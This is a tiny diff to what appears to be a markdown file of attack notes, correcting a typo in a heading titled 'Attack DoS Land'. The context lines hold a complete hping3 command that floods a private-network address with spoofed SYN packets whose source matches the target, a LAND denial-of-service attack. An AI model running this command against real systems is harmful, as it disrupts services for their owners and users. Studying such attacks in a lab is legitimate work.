@@ -15,7 +15,7 @@
 ```
 
 
-## Atack DoS Land
+## Attack DoS Land
 ```
 hping3 -V -c 1000 -d 100 -S -p 21 -s 80
 -k -a 192.168.1.110 192.168.1.110
